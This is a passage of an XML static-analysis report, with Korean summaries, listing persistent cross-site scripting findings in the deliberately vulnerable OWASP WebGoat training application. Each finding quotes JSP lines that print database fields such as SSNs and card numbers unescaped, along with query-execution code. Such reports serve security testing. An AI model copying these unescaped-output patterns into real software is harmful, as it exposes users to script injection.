                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A7736DC232CC23C6D57318B83B2740D3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D60A0A0419878A23850BC03A38A3F3D8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="66888B3B699DB15014BEEDBDAC71FA40" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D9AE7B7B6D5E42E7045D8388D24D68B4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2C07D5250285F7C5A646BCE24D370F0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6FE61F384C1F6F903BF7F9582D94CD72" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="12FCB56E83BEF690908FE1EAEE4DF0D1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="195B23AD90D77C6F0755D7C4089F1F7A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A83BC06C2324CE0D846241A157B7EDAB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3B7E0E5B3401458E34F56FEB1F7C16C4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 103 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>103</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;textarea name="&lt;%=CrossSiteScripting.DISCIPLINARY_NOTES%&gt;" cols="16" rows="3" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A9D00682BDB65300B83730C998008491" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 writeTable() 메서드가 154 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>154</LineStart>
<Snippet>		for (int i = 1; i &lt; (numColumns + 1); i++)
		{
		    row.addElement(new TD(results.getString(i).replaceAll(" ",
			    "&amp;nbsp;")));
		}</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>220</LineStart>
<Snippet>	try
	{
	    ResultSet results = statement3.executeQuery(query);

	    while (results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="546D6ABE1FA82F82A9F2AE8A866BCE2C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EB50BDCF4B5AA41E13448FFEC64BC3DA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D94D1CB185593C17527616A386354CE0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0612B1DC8E44DEDAB0D06304194B184D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="10FA4E0DCB6D0168F06AB95C719BC0AA" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="894265709659DE971726F5F130DDD38E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="79910AED09533BC7DFFC93A2936EBB29" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="94194D9479DD0746D8E33E381CA7EBA4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="89A1DA0110B048F0C1FA83091CEFBC7E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
